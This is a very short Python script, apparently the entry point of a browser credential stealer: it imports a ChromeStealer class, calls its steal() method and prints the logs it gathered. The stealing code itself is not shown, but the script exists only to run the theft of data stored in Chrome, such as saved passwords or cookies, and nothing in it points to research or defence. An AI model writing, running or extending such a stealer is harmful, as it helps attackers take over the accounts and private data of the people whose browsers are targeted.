from chromeStealer import ChromeStealer 

if __name__ == "__main__":
    stealer = ChromeStealer()
    stealer.steal()
    print(stealer.getLogs())